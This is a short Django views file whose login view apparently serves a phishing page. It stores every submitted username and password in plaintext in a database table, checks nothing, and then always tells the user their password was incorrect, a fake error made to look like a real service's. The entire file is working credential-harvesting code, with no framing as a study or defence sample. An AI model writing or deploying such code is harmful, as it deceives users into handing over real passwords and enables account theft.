# yourappname/views.py

from django.shortcuts import render
from .models import UserLogin
from django.contrib import messages
def index(request):
    return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
def login_view(request):
    success_message = None

    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Save form data to the database
        user_login = UserLogin(username=username, password=password)
        user_login.save()

        # Perform necessary actions, e.g., save to the database

        success_message = 'Sorry, your password was incorrect. Please double-check your password.'
        messages.success(request, success_message)

    return render(request, 'myapp/index.html', {'success_message': success_message})